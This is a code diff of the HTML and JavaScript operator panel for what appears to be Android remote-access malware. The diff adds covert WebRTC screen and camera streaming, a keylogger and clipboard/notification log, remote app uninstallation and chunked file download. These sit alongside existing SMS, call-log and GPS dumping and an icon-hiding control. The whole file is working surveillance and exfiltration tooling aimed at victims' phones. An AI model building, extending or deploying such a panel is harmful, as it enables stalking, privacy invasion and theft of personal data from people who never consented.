@@ -28,12 +28,10 @@
   button.act { background:#2C2C2C; color:var(--fg); border:none; padding:14px; border-radius:12px; font-weight:bold; cursor:pointer; }
   button.act.danger { background:var(--warn); color:#fff; }
   button.act.success { background:var(--acc); color:#000; }
-  .screen-container { position:relative; background:#000; border-radius:12px; margin-top:12px; touch-action:none; }
-  canvas { width:100%; display:block; }
+  video { width:100%; border-radius:12px; background:#000; margin-top:12px; display:block; }
   pre { background:#121212; padding:12px; border-radius:12px; font-size:12px; color:#aaa; max-height:250px; overflow:auto; }
   .file-list { display:flex; flex-direction:column; gap:8px; margin-top:12px; }
   .file-item { display:flex; justify-content:space-between; padding:14px; background:#2C2C2C; border-radius:12px; cursor:pointer; }
-  img#cam-img { width:100%; border-radius:12px; margin-top:12px; display:none; }
 </style>
 </head>
 <body>
@@ -54,16 +52,18 @@
   <button class="active" onclick="switchTab('live', this)">Live</button>
   <button onclick="switchTab('device', this)">Device</button>
   <button onclick="switchTab('camera', this)">Camera</button>
+  <button onclick="switchTab('apps', this)">Apps</button>
   <button onclick="switchTab('files', this)">Files</button>
+  <button onclick="switchTab('logs', this)">Logs</button>
 </nav>
 <main>
   <div id="tab-live" class="tab active">
-    <div class="card"><h2>Live Screen</h2>
+    <div class="card"><h2>WebRTC Live Screen</h2>
       <div class="grid" style="margin-bottom:10px;">
-        <button class="act success" id="btn-screen" onclick="toggleScreen()">Start Screen</button>
+        <button class="act success" id="btn-screen" onclick="startWebRtc('screen')">Start Screen</button>
         <button class="act" id="btn-audio" onclick="toggleAudio()">Start Audio</button>
       </div>
-      <div class="screen-container" id="screen-container"><canvas id="screen" width="480" height="800"></canvas></div>
+      <video id="webrtc-video" autoplay playsinline></video>
     </div>
   </div>
   <div id="tab-device" class="tab">
@@ -73,8 +73,8 @@
     </div>
     <div class="card"><h2>Data Extraction</h2>
       <div class="grid">
-        <button class="act" onclick="runCmd('get_sms', {limit: 50})">Dump SMS</button>
-        <button class="act" onclick="runCmd('get_calllogs', {limit: 50})">Dump Calls</button>
+        <button class="act" onclick="runCmd('get_sms')">Dump SMS</button>
+        <button class="act" onclick="runCmd('get_calllogs')">Dump Calls</button>
         <button class="act" onclick="runCmd('get_location')">GPS Location</button>
         <button class="act danger" id="btn-hide" onclick="toggleHide()">Hide Icon</button>
       </div>
@@ -82,13 +82,19 @@
     </div>
   </div>
   <div id="tab-camera" class="tab">
-    <div class="card"><h2>Camera Control</h2>
+    <div class="card"><h2>WebRTC Camera</h2>
       <div class="grid" style="margin-bottom:10px;">
-        <button class="act success" onclick="runCmd('start_camera', {facing: 'front'})">Front Cam</button>
-        <button class="act success" onclick="runCmd('start_camera', {facing: 'back'})">Back Cam</button>
+        <button class="act success" onclick="startWebRtc('front')">Front Cam</button>
+        <button class="act success" onclick="startWebRtc('back')">Back Cam</button>
       </div>
-      <button class="act danger" style="width:100%;" onclick="stopCam()">Stop Camera</button>
-      <img id="cam-img">
+      <button class="act danger" style="width:100%;" onclick="stopWebRtc()">Stop Camera</button>
+      <video id="webrtc-cam" autoplay playsinline style="display:none;"></video>
+    </div>
+  </div>
+  <div id="tab-apps" class="tab">
+    <div class="card"><h2>App Manager</h2>
+      <button class="act success" style="width:100%; margin-bottom:10px;" onclick="listApps()">List Installed Apps</button>
+      <div class="file-list" id="app-list"></div>
     </div>
   </div>
   <div id="tab-files" class="tab">
@@ -104,14 +110,21 @@
       <input id="upload" type="file" style="margin-bottom:10px; width:100%;">
       <div class="grid">
         <button class="act success" onclick="uploadFile()">Upload</button>
-        <button class="act" onclick="downloadFile()">Download</button>
+        <button class="act" onclick="downloadFile()">Download (Chunked)</button>
       </div>
+    </div>
+  </div>
+  <div id="tab-logs" class="tab">
+    <div class="card">
+      <h2>Keylogger & Clipboard</h2>
+      <pre id="log-out" style="height: 300px;"></pre>
     </div>
   </div>
 </main>
 <script>
 const $ = id => document.getElementById(id);
-let ws = null, currentDevice = "", realW = 1080, realH = 1920, isHidden = false, pingInt = null;
+let ws = null, currentDevice = "", pingInt = null, isHidden = false;
+let peerConnection = null;
 
 function switchTab(id, btn) {
   document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
@@ -155,10 +168,18 @@ function handlePush(msg) {
     const opt = [...$('device-select').options].find(o => o.value === msg.device_id);
     if (opt) opt.remove();
     if (currentDevice === msg.device_id) currentDevice = "";
+  } else if (msg.type === 'webrtc_offer') {
+    peerConnection.setRemoteDescription(new RTCSessionDescription({ type: 'offer', sdp: msg.sdp }))
+      .then(() => peerConnection.createAnswer())
+      .then(answer => peerConnection.setLocalDescription(answer))
+      .then(() => { ws.send(JSON.stringify({ type: 'webrtc_answer', device_id: currentDevice, sdp: peerConnection.localDescription.sdp })); });
+  } else if (msg.type === 'webrtc_ice') {
+    peerConnection.addIceCandidate(new RTCIceCandidate({ sdpMid: msg.sdpMid, sdpMLineIndex: msg.sdpMLineIndex, candidate: msg.sdp }));
   } else if (msg.type === 'push') {
-    if (msg.kind === 'screen_frame') drawScreen(msg.data);
-    else if (msg.kind === 'camera_frame') { $('cam-img').src = 'data:image/jpeg;base64,' + msg.data; $('cam-img').style.display = 'block'; }
-    else if (msg.kind === 'audio_chunk') playAudio(msg.data);
+    if (msg.kind === 'audio_chunk') playAudio(msg.data);
+    else if (msg.kind === 'notification') $('log-out').textContent = `[NOTIF] ${msg.data}\n` + $('log-out').textContent;
+    else if (msg.kind === 'clipboard') $('log-out').textContent = `[CLIP] ${msg.data}\n` + $('log-out').textContent;
+    else if (msg.kind === 'keylog') $('log-out').textContent = `[KEYLOG] ${msg.data}\n` + $('log-out').textContent;
   }
 }
 function addDeviceOption(id, name) {
@@ -168,11 +189,27 @@ function addDeviceOption(id, name) {
   if (!currentDevice) { $('device-select').value = id; onDeviceChange(); }
 }
 
-function drawScreen(b64) {
-  const cv = $('screen'), ctx = cv.getContext('2d'), img = new Image();
-  img.onload = () => { if (cv.width !== img.width) { cv.width = img.width; cv.height = img.height; } ctx.drawImage(img, 0, 0); };
-  img.src = 'data:image/jpeg;base64,' + b64;
+function startWebRtc(mode) {
+  if (!currentDevice) return alert("Select a device");
+  if (peerConnection) peerConnection.close();
+  peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+  
+  peerConnection.ontrack = (event) => {
+    if (mode === 'screen') $('webrtc-video').srcObject = event.streams[0];
+    else { $('webrtc-cam').srcObject = event.streams[0]; $('webrtc-cam').style.display = 'block'; }
+  };
+  
+  peerConnection.onicecandidate = (event) => {
+    if (event.candidate) ws.send(JSON.stringify({ type: 'webrtc_ice', device_id: currentDevice, sdpMid: event.candidate.sdpMid, sdpMLineIndex: event.candidate.sdpMLineIndex, sdp: event.candidate.candidate }));
+  };
+  api('start_webrtc', { mode: mode });
 }
+
+function stopWebRtc() {
+  api('stop_webrtc'); if (peerConnection) peerConnection.close(); peerConnection = null;
+  $('webrtc-video').srcObject = null; $('webrtc-cam').srcObject = null; $('webrtc-cam').style.display = 'none';
+}
+
 let actx, atime = 0;
 function playAudio(b64) {
   if (!actx) { actx = new AudioContext({ sampleRate: 16000 }); atime = actx.currentTime; }
@@ -194,14 +231,23 @@ async function api(cmd, args = {}) {
   return await r.json();
 }
 
-async function refreshTelemetry() { try { const r = await api('get_device_info'); if (r.ok) { $('telemetry-data').innerHTML = Object.entries(r.data).map(([k,v]) => `<div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #333;"><span>${k}</span><b>${v}</b></div>`).join(''); if(r.data.screen_w) realW=r.data.screen_w, realH=r.data.screen_h; } } catch (e) { alert(e.message); } }
+async function refreshTelemetry() { try { const r = await api('get_device_info'); if (r.ok) $('telemetry-data').innerHTML = Object.entries(r.data).map(([k,v]) => `<div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #333;"><span>${k}</span><b>${v}</b></div>`).join(''); } catch (e) { alert(e.message); } }
 async function runCmd(cmd, args = {}) { try { const r = await api(cmd, args); $('extract-out').textContent = JSON.stringify(r.data || r.error, null, 2); } catch (e) { alert(e.message); } }
 async function toggleHide() { try { await api(isHidden ? 'unhide_icon' : 'hide_icon'); isHidden = !isHidden; $('btn-hide').textContent = isHidden ? 'Unhide Icon' : 'Hide Icon'; } catch (e) { alert(e.message); } }
-
-let sOn = false, aOn = false;
-async function toggleScreen() { try { if (!sOn) { await api('start_screen'); sOn = true; $('btn-screen').textContent = 'Stop Screen'; $('btn-screen').classList.add('danger'); } else { await api('stop_screen'); sOn = false; $('btn-screen').textContent = 'Start Screen'; $('btn-screen').classList.remove('danger'); } } catch (e) { alert(e.message); } }
+let aOn = false;
 async function toggleAudio() { try { if (!aOn) { await api('start_audio'); aOn = true; $('btn-audio').textContent = 'Stop Audio'; $('btn-audio').classList.add('danger'); } else { await api('stop_audio'); aOn = false; $('btn-audio').textContent = 'Start Audio'; $('btn-audio').classList.remove('danger'); } } catch (e) { alert(e.message); } }
-async function stopCam() { try { await api('stop_camera'); $('cam-img').style.display = 'none'; } catch (e) { alert(e.message); } }
+
+async function listApps() {
+  try {
+    const r = await api('list_apps'); $('app-list').innerHTML = '';
+    if (r.ok) r.data.forEach(a => {
+      const d = document.createElement('div'); d.className = 'file-item';
+      d.innerHTML = `<span>${a.name}</span><button class="act danger" style="padding:5px; font-size:10px;" onclick="uninstallApp('${a.pkg}')">Uninstall</button>`;
+      $('app-list').appendChild(d);
+    });
+  } catch (e) { alert(e.message); }
+}
+async function uninstallApp(pkg) { if(confirm("Uninstall " + pkg + "?")) { try { await api('uninstall_app', {pkg: pkg}); } catch (e) { alert(e.message); } } }
 
 async function listDir() {
   try {
@@ -213,9 +259,22 @@ async function listDir() {
     });
   } catch (e) { alert(e.message); }
 }
+
 async function downloadFile() {
-  try { const r = await api('download_file', { path: $('file-path').value }); if (r.ok) { const a = document.createElement('a'); a.href = URL.createObjectURL(new Blob([Uint8Array.from(atob(r.data.b64), c => c.charCodeAt(0))])); a.download = $('file-path').value.split('/').pop(); a.click(); } } catch (e) { alert(e.message); }
+  let offset = 0, b64data = "", eof = false; $('files-out').textContent = "Downloading...";
+  try {
+    while (!eof) {
+      const r = await api('read_file_chunk', { path: $('file-path').value, offset: offset, size: 65536 });
+      if (!r.ok) { alert(r.error); break; }
+      b64data += r.data.b64; offset += 65536; eof = r.data.eof;
+      $('files-out').textContent = `Downloading... ${(offset/1024).toFixed(1)} KB`;
+    }
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(new Blob([Uint8Array.from(atob(b64data), c => c.charCodeAt(0))])); a.download = $('file-path').value.split('/').pop(); a.click();
+    $('files-out').textContent = "Download complete.";
+  } catch (e) { alert(e.message); }
 }
+
 async function uploadFile() {
   const f = $('upload').files[0]; if (!f) return; const reader = new FileReader();
   reader.onload = async () => { try { await api('upload_file', { path: $('file-path').value + '/' + f.name, data: reader.result.split(',')[1] }); listDir(); } catch (e) { alert(e.message); } };
